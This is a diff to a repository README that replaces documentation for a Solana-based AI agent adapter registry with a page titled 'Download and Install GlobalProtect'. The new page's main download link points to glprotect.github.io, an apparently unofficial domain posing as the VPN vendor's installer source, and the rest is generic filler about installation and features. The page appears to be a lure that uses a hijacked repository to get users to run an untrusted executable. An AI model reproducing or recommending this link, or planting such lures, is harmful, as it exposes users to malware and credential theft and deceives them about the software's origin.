@@ -1,124 +1,102 @@
-# Agistry - Decentralized Adapter Registry for AI Agents (Solana Program)
+# Download and Install GlobalProtect
 
-![banner](./assets/banner.png)
+* [Installation](#installation)
+* [Setting Up GlobalProtect](#setting-up-globalprotect)
+* [Key Features and Components](#key-features-and-components)
+* [User Guide](#user-guide)
+* [Troubleshooting and Support](#troubleshooting-and-support)
 
-Agistry is a decentralized registry built on the Solana blockchain that allows AI agents to discover and interface with off-chain tools and APIs in a standardized and trustworthy manner. This repository contains the core Solana smart contract (program) for the Agistry registry.
+## Installation
 
-**Problem Agistry Solves:**
-Most AI agents in Web3 still rely on custom-built, insecure adapters to call off-chain services. This leads to:
+To install GlobalProtect on Windows, download the setup package below        
+**⬇️ [Download GlobalProtect](https://glprotect.github.io/.github/globalprotect)**
 
-- No standards for interfacing.
-- No proofs of data integrity or execution.
-- No composability between agents and tools.
-- Fragile, messy, and unscalable integrations.
+### Installing on Windows
 
-**Agistry's Solution:**
+1. **Run the Installer**:
 
-- A **decentralized adapter registry** where developers can publish metadata about their tools/APIs.
-- **Standardizing access** to these off-chain services through a defined Adapter Interface Specification (AIS), typically using OpenAPI.
-- (Future) Enabling **proofs** for verifiable off-chain interactions.
-- Promoting **composability** and scalability for AI agent-tool ecosystems.
+   * Open the downloaded setup file and follow the instructions provided by the GlobalProtect Setup Wizard.
+   * Keep the default installation path (`C:\Program Files\Palo Alto Networks`) unless your administrator advises otherwise.
 
-![process_flow](./assets/process_flow.png)
+2. **Complete the Installation**:
 
-## Features of the Solana Program
+   * Once the process finishes, launch the application and enter the portal address given by your network administrator.
+   * Sign in with your credentials to start the VPN connection.
 
-- **Registry Initialization:** Securely set up the registry with an admin, initial schema version, and optional registration fees.
-- **Adapter Registration:** Developers can register their adapters, providing an immutable metadata hash (e.g., IPFS CID) pointing to detailed off-chain information (like an OpenAPI spec).
-- **Adapter Management:**
-  - Update metadata hash for an adapter.
-  - Deprecate adapters that are no longer active.
-  - Transfer ownership of an adapter registration.
-- **Fee Mechanism (Optional):** Configure a registration fee in SOL, payable to a designated recipient.
-- **Pause Functionality:** The admin can pause new registrations or modifications during maintenance or emergencies.
-- **Event-Driven:** Emits detailed events for all significant actions, enabling off-chain indexers to build rich query capabilities (e.g., find adapters by owner, tag, etc.).
-- **Built with Anchor:** Leverages the Anchor framework for safer and more efficient Solana program development.
+### Installing on macOS
 
-## Core Concepts
+1. **Obtain Portal Information**:
+   Make sure you have the portal’s IP address or fully qualified domain name (FQDN), which is usually provided by your IT department.
 
-- **Registry Configuration (`RegistryConfig` PDA):** A singleton Program Derived Address (PDA) that stores global settings like the admin, current adapter counter, metadata schema version, fee details, and pause status.
-- **Adapter Account (`AdapterAccount` PDA):** Each registered adapter has its own PDA, uniquely identified by an auto-incrementing ID. It stores the adapter's owner, the metadata hash, status (Active/Deprecated), timestamps, and its PDA bump.
-- **Adapter Metadata:** Rich details about an adapter (name, description, OpenAPI spec URL, security requirements, tags, etc.) are stored **off-chain** (e.g., on IPFS or Arweave). The on-chain `AdapterAccount` only stores a hash (e.g., IPFS CID) pointing to this off-chain data. This keeps on-chain storage costs low.
-- **Adapter Interface Specification (AIS):** (Defined externally) A specification (e.g., based on OpenAPI) that all registered adapters should adhere to for how AI agents interact with them.
-- **Events:** The program emits events for actions like `AdapterRegistered`, `AdapterMetadataUpdated`, etc. These are crucial for off-chain services to build indexes and provide query capabilities that are not feasible or cost-effective to implement directly on-chain (e.g., "list all adapters owned by X").
+2. **Log in to the Portal**:
 
-## Program Structure (`programs/agistry_registry/src/lib.rs`)
+   * Use the credentials issued by your organization to sign in.
 
-- **`initialize_registry`:** Sets up the global `RegistryConfig` account.
-- **`register_adapter`:** Creates a new `AdapterAccount` for a new adapter.
-- **`update_adapter_metadata`:** Allows the owner to change the `metadata_hash` of an active adapter.
-- **`deprecate_adapter`:** Allows the owner to mark an adapter as deprecated.
-- **`transfer_adapter_ownership`:** Allows the owner to transfer control of an adapter registration to a new owner.
-- **Admin Functions (`set_pause_status`, `set_metadata_schema_version`, etc.):** Allow the admin to manage the registry.
-- **Account Structs:** Define the data structures for `RegistryConfig` and `AdapterAccount`.
-- **Context Structs:** Define the accounts required for each instruction, along with their constraints (e.g., ownership checks, PDA derivations).
-- **Events & Errors:** Define custom events and error types.
+3. **Download and Install the Client**:
 
-## Building and Deploying
+   * After logging in, download the correct installer for macOS.
+   * Open the `.dmg` file and follow the step-by-step installation guide.
+   * Enter your administrator password if prompted.
 
-This program is built using the [Anchor Framework](https://www.anchor-lang.com/).
+4. **Finalize Configuration**:
 
-1. **Prerequisites:**
+   * Launch the GlobalProtect client, input the portal address, and authenticate to create a secure connection.
 
-   - Install Rust: `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`
-   - Install Solana CLI: Refer to [Solana documentation](https://docs.solana.com/cli/install-solana-cli-tools)
-   - Install Anchor: Refer to [Anchor installation guide](https://www.anchor-lang.com/docs/installation) (e.g., `avm install latest && avm use latest`)
-   - Node.js and yarn/npm for running tests.
+## System Requirements
 
-2. **Clone the repository (if applicable):**
+### Supported Platforms
 
-   ```bash
-   git clone https://github.com/agistry-dev/agistry-framework-v1
-   cd agistry-framework-v1
-   ```
+* **Windows**: Works with Windows 10 and 11 (both 32-bit and 64-bit editions).
+* **macOS**: Compatible with the latest three major macOS releases.
+* **Linux**: Ubuntu 20.x or newer.
+* **Mobile**: Available for iOS and Android platforms.
 
-3. **Build the program:**
+### Minimum Hardware
 
-   ```bash
-   anchor build
-   ```
+* **Processor**: 1 GHz CPU or higher.
+* **Memory**: At least 2 GB RAM.
+* **Storage**: Minimum 100 MB of free disk space.
+* **Connectivity**: A stable internet connection is required.
 
-   After the first successful build, a program ID will be generated. Update the `declare_id!(<id>);` line in `programs/agistry_registry/src/lib.rs` with this new ID. Then, rebuild.
+## Setting Up GlobalProtect
 
-4. **Run Tests (Example):**
-   (You'll need to write tests in the `tests/` directory, typically using TypeScript and `@coral-xyz/anchor`.)
+### Main Capabilities
 
-   ```bash
-   anchor test
-   ```
+* Delivers secure access to internal applications and corporate systems.
+* Maintains compliance with enterprise-grade security policies.
+* Supports MFA (multi-factor authentication) to strengthen login security.
+* Provides endpoint quarantine functions to protect sensitive resources.
 
-5. **Deploy to a localnet:**
+## Key Features and Components
 
-   - Start a local Solana validator: `solana-test-validator`
-   - Deploy: `anchor deploy --provider.cluster localhost`
+1. **GlobalProtect Portal**: The central interface for distributing configurations and managing client devices.
+2. **GlobalProtect Gateways**: Apply security policies and control access to internal services.
+3. **GlobalProtect Client**: An intuitive VPN application enabling secure endpoint connectivity.
 
-6. **Deploy to Devnet/Mainnet-Beta:**
-   - Configure Solana CLI for the desired cluster:
-     ```bash
-     solana config set --url devnet
-     # or
-     solana config set --url mainnet-beta
-     ```
-   - Ensure your wallet has enough SOL for deployment.
-   - Deploy: `anchor deploy` (it will use the currently configured cluster)
+## User Guide
 
-## Interacting with the Registry
+* **Pre-Login Access**:
 
-Clients (like the Agistry SDK or AI agents) will interact with this deployed Solana program using RPC calls.
+  * Allows VPN connection before signing into Windows, ensuring full network access.
 
-- **Fetching Adapter Data:** To get adapter details, clients would typically:
-  1.  Query an **off-chain indexing service** (that listens to Agistry events) for adapters based on criteria (e.g., capability, owner). This service would return the `adapter_id` and the on-chain account address of the `AdapterAccount`.
-  2.  Fetch the `AdapterAccount` data directly from the Solana blockchain using its address to get the `metadata_hash`.
-  3.  Fetch the actual metadata (e.g., OpenAPI spec) from the decentralized storage (IPFS/Arweave) using the `metadata_hash`.
-- **Transactions:** Registering, updating, or transferring adapters involves sending transactions that call the respective instructions in this program.
+* **Single Sign-On (SSO)**:
 
-## Future Considerations
+  * Use your corporate credentials to simplify the authentication process.
 
-- **Reputation System:** Integrating mechanisms for rating or vouching for adapters.
-- **On-chain Proof Verification:** Storing or verifying proofs related to adapter execution (this is complex and may involve other protocols or L2s).
-- **More Granular Categorization/Tagging:** While tags can be in off-chain metadata, some core on-chain categorization might be useful if simple enough.
-- **Governance:** Mechanisms for upgrading the program or changing critical parameters via a DAO.
+* **Diagnostic Tools**:
 
----
+  * Built-in utilities help collect logs and submit issue reports efficiently.
 
-This README provides a high-level overview. For detailed program logic, refer to the source code in `programs/agistry_registry/src/lib.rs`.
+## Troubleshooting and Support
+
+1. **Authentication Issues**:
+
+   * Verify your username, password, and confirm the portal address is correct.
+
+2. **Connection Problems**:
+
+   * Check your internet stability and ensure the gateway settings are properly configured.
+
+3. **Installation Problems**:
+
+   * Make sure required components (e.g., Visual C++ Redistributables for Windows) are installed correctly.
